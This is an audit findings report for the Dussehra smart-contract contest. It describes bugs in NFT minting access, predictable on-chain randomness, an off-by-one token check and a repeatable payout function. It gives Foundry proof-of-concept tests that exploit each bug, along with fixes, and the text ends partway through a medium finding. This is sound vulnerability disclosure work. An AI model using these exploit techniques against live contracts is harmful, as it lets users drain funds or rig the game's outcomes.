# First Flight #17: Dussehra - Findings Report

# Table of contents
- ### [Contest Summary](#contest-summary)
- ### [Results Summary](#results-summary)
- ## High Risk Findings
    - [H-01. The ChoosingRam::selectRamIfNotSelected always overrides selectedRam before the end of the event. ](#H-01)
    - [H-02. Everyone can mint `RamNFT` without paying entrance fee and even become Ram with it](#H-02)
    - [H-03. The user can predict the outcome of the `ChoosingRam::increaseValuesOfParticipants` to become Ram and get the reward](#H-03)
    - [H-04. Wrong check in `ChoosingRam::increaseValuesOfParticipants` allows users to become Ram by challenging an unexisted participant](#H-04)
- ## Medium Risk Findings
    - [M-01. `Dussehra::killRavana` function can be called twice in row which leads to rewards being denied for selected Ram.](#M-01)
    - [M-02. Lack of check in `ChoosingRam::increaseValuesOfParticipants` function allows that player can play against himself.](#M-02)
- ## Low Risk Findings
    - [L-01. The organiser can predict the outcome of `ChoosingRam::selectRamIfNotSelected` and select the user who will get the reward](#L-01)
    - [L-02. Block.timestamp on Arbitrum can be off by 24 hours. ](#L-02)
    - [L-03. Incorrect Timestamp Validation in `killRavana` Function of `Dussehra` Contract](#L-03)
    - [L-04. Funds are locked in `Dussehra.sol` contract  when the `withdraw` function is called. ](#L-04)


# <a id='contest-summary'></a>Contest Summary

### Sponsor: First Flight #17

### Dates: Jun 6th, 2024 - Jun 13th, 2024

[See more contest details here](https://codehawks.cyfrin.io/c/2024-06-Dussehra)

# <a id='results-summary'></a>Results Summary

### Number of findings:
   - High: 4
   - Medium: 2
   - Low: 4


# High Risk Findings

## <a id='H-01'></a>H-01. The ChoosingRam::selectRamIfNotSelected always overrides selectedRam before the end of the event. 

_Submitted by [vile](/profile/clvl1hox70000qclhbwnf9nhh), [abhishekthakur](/profile/clkaqh5590000k108p39ktfwl), [shikhar229169](/profile/clk3yh639002emf08ywok1hzf), [Kiinzu](/profile/clx32i4zw000wuro9kj83liax), [MattJenkins](/profile/clwg2lch4000k5uks29zntzmd), [heeze](/profile/clvo0x1yi0004at0gi4dxnkow), [Vesper](/profile/clqi6jcnd000q11zrf8zoazye), [CarlosAlbaWork](/profile/clrw1ekq80007u9z6ke2mx6yr), [Keyword](/profile/clq9wfw3c0000ulgq5mkbqnmf), [mayhem](/profile/clx4o39v90008cbjz1uv6cb45), [unnamed](/profile/cluxox1890000tz36ctgyeix8), [paprikrumplikas](/profile/clrj23lnp006g14oum8qxro25), [ansarqureshi10](/profile/clx2ycuyb000112rotykervkf), [funkyenough](/profile/clqotfl5o0006v790craeiqjv), [Mahith](/profile/clk4h065x000amh08ni7y8bpe), [edsardgrisel](/profile/cltitj8pl0000ruev9oot7rnk), [kazan](/profile/clojsw8kw000cl408g7y0xlw5), [NerfZeri](/profile/clx8uzld2000k7ko09z4p4d5i), [NightHawK](/profile/clvmfeh090004jbg1f2oa6srl), [0xlrivo](/profile/clqo26w180006cl27lldffow6), [DanielEth](/profile/clshml0b2000owdlalgjw9d0j), [appet](/profile/cltrb8svc000u2ps0trbj1d8n), [V1vah0us3](/profile/clvzfjns5000024axn3o3i5if), [lulox](/profile/clk7oytas000wme08y4yvo0tp), [poolig4n](/profile/clv6k6av2000so6ttdnmiojn8), [7Cedars](/profile/clvoxksqz000czknxe8hcp7kw), [azanux](/profile/clk45q9ry0000l5080kf923kw), [Bbash](/profile/clkcphh780004mp083mgcgae1), [0x1912](/profile/clumv78j80003i5grvm92bhw4), [10ap17](/profile/clvbi0ngt0000fz99bhftjifl), [Yaioxy](/profile/clpd5e0m30002ll5wwhxvqj1u), [n0kto](/profile/clm0jkw6w0000jv08gaj4hof4), [Coffee](/profile/clln3vyj7000cml0877uhlb7j), [Audix](/profile/clvohjv4k0000j10cbvsj3a1z), [CodexBugmeNot](/profile/cluv8w2my0000nlrt5vqpin31), [kostov](/profile/clqgi3grk0006hu2kfkivifte), [feder](/profile/clukfyu7m000012x3nvwo6cm7), [Josh4324](/profile/clk75kd79000gjw08o1v6ycq7), [mirkopezo](/profile/clt3lx7sj00009lvy1bxxjxi9). Selected submission by: [7Cedars](/profile/clvoxksqz000czknxe8hcp7kw)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2024-06-Dussehra

### [H-5] The `ChoosingRam::increaseValuesOfParticipants` does not set `isRamSelected` to true. It results in the `ChoosingRam::selectRamIfNotSelected` overriding any prior selected Ram before the end of the event. 

**Description:** The `ChoosingRam::increaseValuesOfParticipants` function is meant as a game of chance between two participants (a `tokenIdOfChallenger` and  `tokenIdOfAnyPerticipent`). One of the two receives an increase in characteristics. If enough characteristics have been accumulated, the participant will be selected as the Ram and win half of the fee pool. An additional function `ChoosingRam::selectRamIfNotSelected` allows the `organiser` to select a Ram if none has been selected by a certain time.

However, the `ChoosingRam::increaseValuesOfParticipants` does not set `isRamSelected` to true when it selects a Ram. As a result: 
1. `increaseValuesOfParticipants` can continue to select a Ram even if it has already been selected. 
2. `selectRamIfNotSelected` can overwrite any Ram selected through `increaseValuesOfParticipants`. 
3. Worse, because the `Dussehra::killRavana` function checks if `ChoosingRam::isRamSelected` is true, it forces `ChoosingRam::selectRamIfNotSelected` to be called. This means that the selected Ram will _always_ be set by the `selectRamIfNotSelected` function, not the `increaseValuesOfParticipants`. 

In `ChoosingRam.sol`: 
```javascript
   function increaseValuesOfParticipants(uint256 tokenIdOfChallenger, uint256 tokenIdOfAnyPerticipent)
.
.
.
    } else if (ramNFT.getCharacteristics(tokenIdOfChallenger).isSatyavaakyah == false){
        ramNFT.updateCharacteristics(tokenIdOfChallenger, true, true, true, true, true);
        // Note: isRamSelected not set to true
        selectedRam = ramNFT.getCharacteristics(tokenIdOfChallenger).ram;
    }
.
.
.
    } else if (ramNFT.getCharacteristics(tokenIdOfAnyPerticipent).isSatyavaakyah == false){
        ramNFT.updateCharacteristics(tokenIdOfAnyPerticipent, true, true, true, true, true);
        // Again note: isRamSelected not set to true
        selectedRam = ramNFT.getCharacteristics(tokenIdOfAnyPerticipent).ram;
    }

```

In `Dussehra.sol`: 
```javascript
  function killRavana() public RamIsSelected {
```

**Impact:** The intended functionality of the protocol is for participants to increase their characteristics through the `ChoosingRam::increaseValuesOfParticipants` function until they become Ram. Only in the case that no one has been selected as Ram though `increaseValuesOfParticipants`, does the organiser get to randomly select a Ram. This bug in the protocol breaks its intended logic.   

**Proof of Concept:**
1. Two participants (player1 and player2) call `increaseValuesOfParticipants` until one is selected as Ram. 
2. When `Dussehra::killRavana` is called, it reverts. 
3. When `organiser` calls `selectRamIfNotSelected` it does not revert. 
4. The selectedRam is reset to a new address. 
5. When `Dussehra::killRavana` is called, it does not revert. 
<details>
<summary> Proof of Concept</summary>

Place the following in the `CounterTest` contract of the `Dussehra.t.sol` test file. 
```javascript
      function test_selectRamIfNotSelected_AlwaysSelectsRam() public participants {
        address selectedRam;  
        
        // the organiser enters the protocol, in additional to player1 and player2.  
        vm.startPrank(organiser);
        vm.deal(organiser, 1 ether);
        dussehra.enterPeopleWhoLikeRam{value: 1 ether}();
        vm.stopPrank();
        // check that the organiser owns token id 2:
        assertEq(ramNFT.ownerOf(2), organiser);

        // player1 and player2 play increaseValuesOfParticipants against each other until one is selected. 
        vm.startPrank(player1);
        while (selectedRam == address(0)) {
            choosingRam.increaseValuesOfParticipants(0, 1);
            selectedRam = choosingRam.selectedRam(); 
        }
        // check that selectedRam is player1 or player2: 
        assert(selectedRam== player1 || selectedRam == player2); 
        
        // But when calling Dussehra.killRavana(), it reverts because isRamSelected has not been set to true.  
        vm.expectRevert("Ram is not selected yet!"); 
        dussehra.killRavana(); 
        vm.stopPrank(); 

        // Let the organiser predict when their own token will be selected through the (not so) random selectRamIfNotSelected function. 
        uint256 j;
        uint256 calculatedId; 
        while (calculatedId != 2) {
            j++; 
            vm.warp(1728691200 + j);
            calculatedId = uint256(keccak256(abi.encodePacked(block.timestamp, block.prevrandao))) % ramNFT.tokenCounter();
        }
        // when the desired id comes up, the organiser calls `selectRamIfNotSelected`: 
        vm.startPrank(organiser); 
        choosingRam.selectRamIfNotSelected(); 
        vm.stopPrank();
        selectedRam = choosingRam.selectedRam();  

        // check that selectedRam is now the organiser: 
        assert(selectedRam == organiser); 
        // and we can call killRavana() without reverting: 
        dussehra.killRavana();  
    }
```
</details>

**Recommended Mitigation:** The simplest mitigation is to set `isRamSelected` to true when a ram is selected through the `increaseValuesOfParticipants` function. 

```diff 
       } else if (ramNFT.getCharacteristics(tokenIdOfChallenger).isSatyavaakyah == false){
            ramNFT.updateCharacteristics(tokenIdOfChallenger, true, true, true, true, true);
+           isRamSelected = true;            
            selectedRam = ramNFT.getCharacteristics(tokenIdOfChallenger).ram;
        }
.
.
.
   } else if (ramNFT.getCharacteristics(tokenIdOfAnyPerticipent).isSatyavaakyah == false){
        ramNFT.updateCharacteristics(tokenIdOfAnyPerticipent, true, true, true, true, true);
+       isRamSelected = true;
        selectedRam = ramNFT.getCharacteristics(tokenIdOfAnyPerticipent).ram;
    }
```

Please note that another mitigation would be to delete the `isRamSelected` state variable altogether and have the `RamIsNotSelected` modifier check if `selectedRam != address(0)`. This simplifies the code and reduces chances of errors. This does necessity additional changes to the `Dussehra.sol` contract. 

## <a id='H-02'></a>H-02. Everyone can mint `RamNFT` without paying entrance fee and even become Ram with it

_Submitted by [vile](/profile/clvl1hox70000qclhbwnf9nhh), [abhishekthakur](/profile/clkaqh5590000k108p39ktfwl), [shikhar229169](/profile/clk3yh639002emf08ywok1hzf), [MattJenkins](/profile/clwg2lch4000k5uks29zntzmd), [nem0x001](/profile/clvxvlp6300092p0m0ax68l8t), [NourElden](/profile/clsj2nv2y0006l5rg1oswt3ys), [4rdiii](/profile/cltd0fp0400016x0wyrg9ny31), [heeze](/profile/clvo0x1yi0004at0gi4dxnkow), [funkyenough](/profile/clqotfl5o0006v790craeiqjv), [Enchev](/profile/clvuhiie70000behfon10s33j), [4lifemen](/profile/clx78updg0000r91i3473u4ld), [Keyword](/profile/clq9wfw3c0000ulgq5mkbqnmf), [Waydou](/profile/clvz7qsg6000011q5lrhfnbx2), [mirkopezo](/profile/clt3lx7sj00009lvy1bxxjxi9), [Mahith](/profile/clk4h065x000amh08ni7y8bpe), [paprikrumplikas](/profile/clrj23lnp006g14oum8qxro25), [NerfZeri](/profile/clx8uzld2000k7ko09z4p4d5i), [unnamed](/profile/cluxox1890000tz36ctgyeix8), [DanielEth](/profile/clshml0b2000owdlalgjw9d0j), [kazan](/profile/clojsw8kw000cl408g7y0xlw5), [AuditorNate](/profile/clx5gbk8x0000lu48o9yrw6vz), [NightHawK](/profile/clvmfeh090004jbg1f2oa6srl), [0xlrivo](/profile/clqo26w180006cl27lldffow6), [edsardgrisel](/profile/cltitj8pl0000ruev9oot7rnk), [kostov](/profile/clqgi3grk0006hu2kfkivifte), [lulox](/profile/clk7oytas000wme08y4yvo0tp), [poolig4n](/profile/clv6k6av2000so6ttdnmiojn8), [appet](/profile/cltrb8svc000u2ps0trbj1d8n), [7Cedars](/profile/clvoxksqz000czknxe8hcp7kw), [azanux](/profile/clk45q9ry0000l5080kf923kw), [0x1912](/profile/clumv78j80003i5grvm92bhw4), [Bbash](/profile/clkcphh780004mp083mgcgae1), [Player](/profile/clnm5k51t0000l909phw7oqbo), [Batman](/profile/clkc47fv10006l908u64cn5ef), [V1vah0us3](/profile/clvzfjns5000024axn3o3i5if), [10ap17](/profile/clvbi0ngt0000fz99bhftjifl), [Audix](/profile/clvohjv4k0000j10cbvsj3a1z), [feder](/profile/clukfyu7m000012x3nvwo6cm7), [Yaioxy](/profile/clpd5e0m30002ll5wwhxvqj1u), [CodexBugmeNot](/profile/cluv8w2my0000nlrt5vqpin31), [Coffee](/profile/clln3vyj7000cml0877uhlb7j), [rangappa](/profile/clxc4vyfn000a415fjwungxrc), [DaredEV1L](/profile/clx9ezlvi000ecof9833sooa4), [Josh4324](/profile/clk75kd79000gjw08o1v6ycq7), [0xsherblock](/profile/clxd3ctb20006wa2227xtily7). Selected submission by: [NightHawK](/profile/clvmfeh090004jbg1f2oa6srl)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2024-06-Dussehra/blob/9c86e1b09ed9516bfbb3851c145929806da75d87/src/RamNFT.sol#L49

## Summary

According to the documentation only the `Dussehra` contract is supposed to mint `RamNFTs` and only after payment of the entrance fee. However, this logic is not implemented in the contract and everyone can mint `RamNFT` without payment. Furthermore, they can use this minted NFT into challenges and become the Ram.

## Vulnerability Details

`RamNFTs` are minted by the `RamNFT::mintRamNFT` function. This function takes the adress to which the NFT is minted. It does not check whether it is executed from the deployed `Dussehra` contract or not. This breaks the described logic. Furthermore, due to another vulnerability the users can challenge the same or different minted to them NFTs and be sure to become the Ram no matter the implemented random logic.

## Proof of Concept

The following test demonstrates that everyone can mint `RamNFT` without payment of the entrance fee.

```js
function test_userCanMintNFT() public {
    Dussehra dussehra;
    RamNFT ramNFT;
    ChoosingRam choosingRam;
    address organiser = makeAddr("organiser");
    address player1 = makeAddr("player1");

    vm.startPrank(organiser);
    ramNFT = new RamNFT();
    choosingRam = new ChoosingRam(address(ramNFT));
    dussehra = new Dussehra(1 ether, address(choosingRam), address(ramNFT));
    ramNFT.setChoosingRamContract(address(choosingRam));
    vm.stopPrank();

    vm.startPrank(player1);
    // the user who is not in the contest executes mintRamNFT function
    ramNFT.mintRamNFT(player1);
    vm.stopPrank();

    // the NFT is minted successfully
    assertEq(ramNFT.ownerOf(0), player1);
}
```

The next code demonstrates how the users can even mint multiple NFTs which can further be used so that the user became Ram.

```js
function test_userCanMintMultipleNFTs() public {
    Dussehra dussehra;
    RamNFT ramNFT;
    ChoosingRam choosingRam;
    address organiser = makeAddr("organiser");
    address player1 = makeAddr("player1");

    vm.startPrank(organiser);
    ramNFT = new RamNFT();
    choosingRam = new ChoosingRam(address(ramNFT));
    dussehra = new Dussehra(1 ether, address(choosingRam), address(ramNFT));
    ramNFT.setChoosingRamContract(address(choosingRam));
    vm.stopPrank();

    vm.startPrank(player1);
    vm.deal(player1, 1 ether);
    // the user enters the contest
    dussehra.enterPeopleWhoLikeRam{value: 1 ether}();
    // after this the user will have a legit RamNFT

    // but he can also mint another RamNFT
    ramNFT.mintRamNFT(player1);
    vm.stopPrank();

    // we can see that both RamNFTs belong to the same user
    assertEq(ramNFT.ownerOf(0), ramNFT.ownerOf(1));
}
```

## Impact

The missing check for who can execute `RamNFT::mintRamNFT` breaks the logic of the contract. Further, due to another vulnerability with a different root cause (the `ChoosingRam::increaseValuesOfParticipants` function does not check if the challenged user is the same as the challenger) the users will be able to challenge themselves and easily to become Ram. Even if the other vulnerability is fixed, the reported in this finding is still valid. It allows user who has not paid the entrance fee to become Ram and to get the Ram reward.

## Tools Used

Manual review

## Recommendations

Add checks for who is allowed to execute `RamNFT::mintRamNFT` in a similar way to the one for `RamNFT::updateCharacteristics` but this time for the `Dussehra` contract. See the code below.

```diff
contract RamNFT is ERC721URIStorage {
    ...

+   error RamNFT__NotDussehraContract();

+   modifier onlyDussehraContract() {
+       if (msg.sender != dussehraContract) {
+           revert RamNFT__NotDussehraContract();
+       }
+       _;
+   }

+   address public dussehraContract;

+   function setDussehraContract(
+       address _dussehraContract
+   ) public onlyOrganiser {
+       dussehraContract = _dussehraContract;
+   }

    ...

-   function mintRamNFT(address to) public {
+   function mintRamNFT(address to) public onlyDussehraContract {
      ...
    }

    ...
}
```

Then you should use `ramNFT.setDussehraContract(address(dussehra));` to set the address of the deployed `Dussehra` contract such like using the `ramNFT.setChoosingRamContract(address(choosingRam));` to set the address of the `ChoosingRam` contract.

The code below is a test which proves that with this changes no one other than the `Dussehra` contract can mint `RamNFT`.

```js
error RamNFT__NotDussehraContract();

function test_userCannotMintNFT() public {
    Dussehra dussehra;
    RamNFT ramNFT;
    ChoosingRam choosingRam;
    address organiser = makeAddr("organiser");
    address player1 = makeAddr("player1");

    vm.startPrank(organiser);
    ramNFT = new RamNFT();
    choosingRam = new ChoosingRam(address(ramNFT));
    dussehra = new Dussehra(1 ether, address(choosingRam), address(ramNFT));
    ramNFT.setChoosingRamContract(address(choosingRam));

    // we set the address of the Dussehra contract
    ramNFT.setDussehraContract(address(dussehra));
    vm.stopPrank();

    // we expect a revert with RamNFT__NotDussehraContract
    vm.expectRevert(
        abi.encodeWithSelector(RamNFT__NotDussehraContract.selector)
    );

    vm.startPrank(player1);
    // the user tries to mint RamNFT which will revert
    ramNFT.mintRamNFT(player1);
    vm.stopPrank();
}
```

## <a id='H-03'></a>H-03. The user can predict the outcome of the `ChoosingRam::increaseValuesOfParticipants` to become Ram and get the reward

_Submitted by [vile](/profile/clvl1hox70000qclhbwnf9nhh), [slowbugdev](/profile/clx3aedxf00068fjziqt0r51t), [shikhar229169](/profile/clk3yh639002emf08ywok1hzf), [MattJenkins](/profile/clwg2lch4000k5uks29zntzmd), [mayhem](/profile/clx4o39v90008cbjz1uv6cb45), [4rdiii](/profile/cltd0fp0400016x0wyrg9ny31), [abhishekthakur](/profile/clkaqh5590000k108p39ktfwl), [heeze](/profile/clvo0x1yi0004at0gi4dxnkow), [nem0x001](/profile/clvxvlp6300092p0m0ax68l8t), [NourElden](/profile/clsj2nv2y0006l5rg1oswt3ys), [maikelordaz](/profile/cltpyvz0u0000f3xerby0tpdw), [Keyword](/profile/clq9wfw3c0000ulgq5mkbqnmf), [Waydou](/profile/clvz7qsg6000011q5lrhfnbx2), [ECunha](/profile/clk3xlzln0006mm08dg5tw7eg), [Mahith](/profile/clk4h065x000amh08ni7y8bpe), [AuditorNate](/profile/clx5gbk8x0000lu48o9yrw6vz), [NerfZeri](/profile/clx8uzld2000k7ko09z4p4d5i), [paprikrumplikas](/profile/clrj23lnp006g14oum8qxro25), [edsardgrisel](/profile/cltitj8pl0000ruev9oot7rnk), [mujahideth](/profile/clk4c6ntg002glb0858cwv4yc), [NightHawK](/profile/clvmfeh090004jbg1f2oa6srl), [DanielEth](/profile/clshml0b2000owdlalgjw9d0j), [appet](/profile/cltrb8svc000u2ps0trbj1d8n), [azanux](/profile/clk45q9ry0000l5080kf923kw), [0x1912](/profile/clumv78j80003i5grvm92bhw4), [Player](/profile/clnm5k51t0000l909phw7oqbo), [Audix](/profile/clvohjv4k0000j10cbvsj3a1z), [CodexBugmeNot](/profile/cluv8w2my0000nlrt5vqpin31), [kostov](/profile/clqgi3grk0006hu2kfkivifte), [10ap17](/profile/clvbi0ngt0000fz99bhftjifl), [Josh4324](/profile/clk75kd79000gjw08o1v6ycq7), [DeluxeRaph](/profile/clxd25528001cgb7aksqmimez), [mirkopezo](/profile/clt3lx7sj00009lvy1bxxjxi9), [DaredEV1L](/profile/clx9ezlvi000ecof9833sooa4). Selected submission by: [NightHawK](/profile/clvmfeh090004jbg1f2oa6srl)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2024-06-Dussehra/blob/9c86e1b09ed9516bfbb3851c145929806da75d87/src/ChoosingRam.sol#L33

https://github.com/Cyfrin/2024-06-Dussehra/blob/9c86e1b09ed9516bfbb3851c145929806da75d87/src/ChoosingRam.sol#L52

## Summary

The function `ChoosingRam::increaseValuesOfParticipants` depends on a random value to select the participant to whom to increase the characteristics. This function generates the random number by using `block.timestamp`, `block.prevrandao` and the `msg.sender` values. Those values are considered a bad source of randomness. The users can predict the outcome and execute the function only if they will be the winners of the challenge. This will help them to become Ram.

## Vulnerability Details

Using `block.timestamp` as a source of randomness is commonly advised against, as the outcome can be manipulated by calling contracts. Also, for some chains like zkSync `block.prevrandao` is a [constant value](https://docs.zksync.io/build/developer-reference/ethereum-differences/evm-instructions#difficulty-prevrandao). This will allow the users to predict the result of the calculated number in [Line 52](https://github.com/Cyfrin/2024-06-Dussehra/blob/9c86e1b09ed9516bfbb3851c145929806da75d87/src/ChoosingRam.sol#L52) of `ChoosingRam.sol`: `uint256(keccak256(abi.encodePacked(block.timestamp, block.prevrandao, msg.sender))) % 2`. This will give them the chance to execute a challenge only if they are the winners.

## Proof of Concept

The following code demonstrates how an attack can be executed.

```js
function test_increaseValuesOfParticipantsIsNotRandom() public {
    Dussehra dussehra;
    RamNFT ramNFT;
    ChoosingRam choosingRam;
    address organiser = makeAddr("organiser");
    address player1 = makeAddr("player1");
    address player2 = makeAddr("player2");

    vm.startPrank(organiser);
    ramNFT = new RamNFT();
    choosingRam = new ChoosingRam(address(ramNFT));
    dussehra = new Dussehra(1 ether, address(choosingRam), address(ramNFT));
    ramNFT.setChoosingRamContract(address(choosingRam));
    vm.stopPrank();

    vm.startPrank(player1);
    vm.deal(player1, 1 ether);
    dussehra.enterPeopleWhoLikeRam{value: 1 ether}();
    vm.stopPrank();

    // the second player will predict the outcomes and
    // will become the Ram
    vm.startPrank(player2);
    vm.deal(player2, 1 ether);
    dussehra.enterPeopleWhoLikeRam{value: 1 ether}();
    uint256 winnings = 0;
    uint256 time = 1;
    // this loop will be executed until the second player
    // wins 5 times
    while (winnings < 5) {
        vm.warp(++time);
        if (
            uint256(
                keccak256(
                    abi.encodePacked(
                        block.timestamp,
                        block.prevrandao,
                        player2
                    )
                )
            ) %
                2 ==
            0
        ) {
            // the following block will be executed only if the user
            // is gonna win the challenge
            ++winnings;
            choosingRam.increaseValuesOfParticipants(1, 0);
        }
    }
    vm.stopPrank();

    // as we can see the second player is now the Ram
    assertEq(choosingRam.selectedRam(), player2);
}
```

## Impact

The bad source of randomness gives a malicious user the opportunity to become Ram and to get the reward.

## Tools Used

Manual review

## Recommendations

Consider using a decentralized oracle for the generation of random numbers, such as [Chainlinks VRF](https://docs.chain.link/vrf). The Chainlink VRF gives two methods to request randomness: subscription and direct funding method. They will have their added cost, but will solve the randomness issues of the `Dussehra` contract.

## <a id='H-04'></a>H-04. Wrong check in `ChoosingRam::increaseValuesOfParticipants` allows users to become Ram by challenging an unexisted participant

_Submitted by [shikhar229169](/profile/clk3yh639002emf08ywok1hzf), [4rdiii](/profile/cltd0fp0400016x0wyrg9ny31), [heeze](/profile/clvo0x1yi0004at0gi4dxnkow), [mirkopezo](/profile/clt3lx7sj00009lvy1bxxjxi9), [Waydou](/profile/clvz7qsg6000011q5lrhfnbx2), [NightHawK](/profile/clvmfeh090004jbg1f2oa6srl), [DanielEth](/profile/clshml0b2000owdlalgjw9d0j), [poolig4n](/profile/clv6k6av2000so6ttdnmiojn8), [azanux](/profile/clk45q9ry0000l5080kf923kw), [n0kto](/profile/clm0jkw6w0000jv08gaj4hof4), [kostov](/profile/clqgi3grk0006hu2kfkivifte). Selected submission by: [NightHawK](/profile/clvmfeh090004jbg1f2oa6srl)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2024-06-Dussehra/blob/9c86e1b09ed9516bfbb3851c145929806da75d87/src/ChoosingRam.sol#L37

## Summary

Wrong checks on [Line 37](https://github.com/Cyfrin/2024-06-Dussehra/blob/9c86e1b09ed9516bfbb3851c145929806da75d87/src/ChoosingRam.sol#L37) and [Line 40](https://github.com/Cyfrin/2024-06-Dussehra/blob/9c86e1b09ed9516bfbb3851c145929806da75d87/src/ChoosingRam.sol#L40) of the `ChoosingRam` contract allows the users to challenge an unexisted participant. This increases their chance to become Ram and get the reward.

## Vulnerability Details

The `ChoosingRam::increaseValuesOfParticipants` function is expected to revert when an unexisted token id is challenged. For this purpose the `RamNFT` contract counts the number of minted NFT tokens and provides the function `RamNFT::tokenCounter`. The returned value of this function is not used correctly in the equation in [Line 37](https://github.com/Cyfrin/2024-06-Dussehra/blob/9c86e1b09ed9516bfbb3851c145929806da75d87/src/ChoosingRam.sol#L37) of the `ChoosingRam`. The equation must be `tokenIdOfChallenger >= ramNFT.tokenCounter()` instead of `tokenIdOfChallenger > ramNFT.tokenCounter()`. Also for [Line 40](https://github.com/Cyfrin/2024-06-Dussehra/blob/9c86e1b09ed9516bfbb3851c145929806da75d87/src/ChoosingRam.sol#L40) the equation must be `tokenIdOfAnyPerticipent >= ramNFT.tokenCounter()` and not `tokenIdOfAnyPerticipent > ramNFT.tokenCounter()`.

## Proof of Concept

The following test shows that the `ChoosingRam::increaseValuesOfParticipants` is not reverting as expected.

```js
function test_usersCanChallengeUnexistedToken() public {
    Dussehra dussehra;
    RamNFT ramNFT;
    ChoosingRam choosingRam;
    address organiser = makeAddr("organiser");
    address player1 = makeAddr("player1");

    vm.startPrank(organiser);
    ramNFT = new RamNFT();
    choosingRam = new ChoosingRam(address(ramNFT));
    dussehra = new Dussehra(1 ether, address(choosingRam), address(ramNFT));
    ramNFT.setChoosingRamContract(address(choosingRam));
    vm.stopPrank();

    vm.startPrank(player1);
    vm.deal(player1, 1 ether);
    dussehra.enterPeopleWhoLikeRam{value: 1 ether}();
    vm.warp(2);
    // there is only one participant with only one RamNFT token
    // but the increaseValuesOfParticipants function will not revert
    // if token ids 0 and 1 are used
    choosingRam.increaseValuesOfParticipants(0, 1);
    choosingRam.increaseValuesOfParticipants(0, 1);
    choosingRam.increaseValuesOfParticipants(0, 1);
    choosingRam.increaseValuesOfParticipants(0, 1);
    choosingRam.increaseValuesOfParticipants(0, 1);
    vm.stopPrank();

    // and finally the only player will be Ram
    // without winning any challenge with another player
    // actually, even there is no another player who had
    // entered the contest
    assertEq(choosingRam.selectedRam(), player1);
}
```

## Impact

The users might get the information from the `RamNFT::tokenCounter` and always challenge an unexisted token which will increase their chance to become Ram and get the reward.

## Tools Used

Manual review

## Recommendations

Fix the sign of the equations in [Line 37](https://github.com/Cyfrin/2024-06-Dussehra/blob/9c86e1b09ed9516bfbb3851c145929806da75d87/src/ChoosingRam.sol#L37) and [Line 40](https://github.com/Cyfrin/2024-06-Dussehra/blob/9c86e1b09ed9516bfbb3851c145929806da75d87/src/ChoosingRam.sol#L40) of the `ChoosingRam`. See the code below.

```diff
function increaseValuesOfParticipants(
    uint256 tokenIdOfChallenger,
    uint256 tokenIdOfAnyPerticipent
) public RamIsNotSelected {
-   if (tokenIdOfChallenger > ramNFT.tokenCounter()) {
+   if (tokenIdOfChallenger >= ramNFT.tokenCounter()) {
        revert ChoosingRam__InvalidTokenIdOfChallenger();
    }
-   if (tokenIdOfAnyPerticipent > ramNFT.tokenCounter()) {
+   if (tokenIdOfAnyPerticipent >= ramNFT.tokenCounter()) {
        revert ChoosingRam__InvalidTokenIdOfPerticipent();
    }
}
```


# Medium Risk Findings

## <a id='M-01'></a>M-01. `Dussehra::killRavana` function can be called twice in row which leads to rewards being denied for selected Ram.

_Submitted by [vile](/profile/clvl1hox70000qclhbwnf9nhh), [abhishekthakur](/profile/clkaqh5590000k108p39ktfwl), [MattJenkins](/profile/clwg2lch4000k5uks29zntzmd), [shikhar229169](/profile/clk3yh639002emf08ywok1hzf), [4rdiii](/profile/cltd0fp0400016x0wyrg9ny31), [heeze](/profile/clvo0x1yi0004at0gi4dxnkow), [mayhem](/profile/clx4o39v90008cbjz1uv6cb45), [Keyword](/profile/clq9wfw3c0000ulgq5mkbqnmf), [Waydou](/profile/clvz7qsg6000011q5lrhfnbx2), [Modey](/profile/clk7cgj0j000alc08b0gl3epd), [nem0x001](/profile/clvxvlp6300092p0m0ax68l8t), [DanielEth](/profile/clshml0b2000owdlalgjw9d0j), [NerfZeri](/profile/clx8uzld2000k7ko09z4p4d5i), [funkyenough](/profile/clqotfl5o0006v790craeiqjv), [mirkopezo](/profile/clt3lx7sj00009lvy1bxxjxi9), [lulox](/profile/clk7oytas000wme08y4yvo0tp), [kazan](/profile/clojsw8kw000cl408g7y0xlw5), [edsardgrisel](/profile/cltitj8pl0000ruev9oot7rnk), [7Cedars](/profile/clvoxksqz000czknxe8hcp7kw), [azanux](/profile/clk45q9ry0000l5080kf923kw), [n0kto](/profile/clm0jkw6w0000jv08gaj4hof4), [Yaioxy](/profile/clpd5e0m30002ll5wwhxvqj1u), [CodexBugmeNot](/profile/cluv8w2my0000nlrt5vqpin31), [feder](/profile/clukfyu7m000012x3nvwo6cm7), [V1vah0us3](/profile/clvzfjns5000024axn3o3i5if), [10ap17](/profile/clvbi0ngt0000fz99bhftjifl), [0xsherblock](/profile/clxd3ctb20006wa2227xtily7). Selected submission by: [mirkopezo](/profile/clt3lx7sj00009lvy1bxxjxi9)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2024-06-Dussehra/blob/9c86e1b09ed9516bfbb3851c145929806da75d87/src/Dussehra.sol#L67

## Summary

The `Dussehra::killRavana` function can be exploited by calling it multiple times within the valid time window, leading to the unintended transfer of funds to the organiser multiple times. This depletes the contract's balance, potentially leaving insufficient funds for the selected Ram to withdraw their rightful share.


## Vulnerability Details

```javascript
    // @audit - can be called twice in row
@>  function killRavana() public RamIsSelected {
        // Oct 11 2024 23:57:49 (GMT)
        if (block.timestamp < 1728691069) {
            revert Dussehra__MahuratIsNotStart();
        }
        // Oct 13 2024 00:01:09 (GMT)
        if (block.timestamp > 1728777669) {
            revert Dussehra__MahuratIsFinished();
        }
        IsRavanKilled = true;
        uint256 totalAmountByThePeople = WantToBeLikeRam.length * entranceFee;
        totalAmountGivenToRam = (totalAmountByThePeople * 50) / 100;
        (bool success, ) = organiser.call{value: totalAmountGivenToRam}("");
        require(success, "Failed to send money to organiser");
    }
```

`Dussehra::killRavana` function allows to kill Ravana and transfers 50% of all entrance fees to organiser. Problem is that `Dussehra::killRavana` function can be called twice in row, and second call will again send 50% of all entrance fees to organiser, which means contract will be empty (or almost empty). Then if selected Ram wants to call `Dussehra::withdraw` function, it will not be able to withdraw because there is no enough funds in `Dussehra` contract for selected Ram.

1. Two players mint their Ram NFTs.
2. After some time organiser calls `ChoosingRam::selectRamIfNotSelected` function and selects one of player as selected Ram.
3. Random caller calls `Dussehra::killRavana` function.
4. Random caller again calls `Dussehra::killRavana` function.
5. Assert that `Dussehra` contract is empty.
6. Selected Ram calls `Dussehra::withdraw` function, and it reverts.

<details>
<summary>PoC</summary>

Place the following test into `Dussehra.t.sol`.

```javascript
